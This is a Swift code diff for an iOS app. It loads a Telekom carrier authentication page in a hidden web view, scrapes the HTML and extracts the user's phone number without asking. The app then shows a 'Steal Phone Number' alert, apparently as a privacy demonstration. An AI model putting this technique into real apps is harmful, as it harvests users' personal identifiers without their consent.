@@ -8,29 +8,48 @@
 
 import UIKit
 import WebKit
+import SwiftSoup
 
-class ViewController: UIViewController, WKNavigationDelegate {
+class ViewController: UIViewController {
     
     @IBOutlet weak var webView: WKWebView!
     
     override func viewDidLoad() {
         super.viewDidLoad()
-        webView.navigationDelegate = self
+        
         let url = URL(string: "https://cap.telekom.de/auth?module=substore&subtempid=11100498&wt_mc=im_co_1842_0001_0001_1510306751")!
         let urlRequest = URLRequest(url: url)
         webView.load(urlRequest)
-        // Do any additional setup after loading the view, typically from a nib.
-    }
-    
-    override func didReceiveMemoryWarning() {
-        super.didReceiveMemoryWarning()
-        // Dispose of any resources that can be recreated.
-    }
-    
-    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
-        webView.evaluateJavaScript("document.documentElement.outerHTML.toString()", completionHandler: { (html: Any?, error: Error?) in
-            print(html)
-        })
+        
+        Timer.scheduledTimer(withTimeInterval: 1, repeats: true) { (timer) in
+            if !self.webView.isLoading {
+                self.webView.evaluateJavaScript("document.documentElement.outerHTML.toString()", completionHandler: { (html: Any?, error: Error?) in
+                    //                    print(html!)
+                    do {
+                        let doc: Document = try! SwiftSoup.parse(html as! String)
+                            let elements = try doc.getElementsByClass("ng-binding ng-scope")
+                            for element in elements {
+                                let potentialPhoneNumber = try element.html()
+                                if potentialPhoneNumber.hasPrefix("+") {
+                                    print("found phone number: \(potentialPhoneNumber)")
+                                    let alertController = UIAlertController(title: "Steal Phone Number", message: "This is an example of how to access the phone number without asking the user. Your phone number is: \(potentialPhoneNumber)", preferredStyle: .alert)
+                                    let ok = UIAlertAction(title: "Learn More", style: .cancel, handler: { (_) in
+                                        self.performSegue(withIdentifier: "showAbout", sender: self)
+                                    })
+                                    alertController.addAction(ok)
+                                    self.present(alertController, animated: true)
+                                    timer.invalidate()
+                                }
+                            }
+                        
+                        
+                    } catch Exception.Error(_, let message) {
+                        print(message)
+                    } catch {
+                        print("error")
+                    }
+                })
+            }
+        }
     }
 }
-
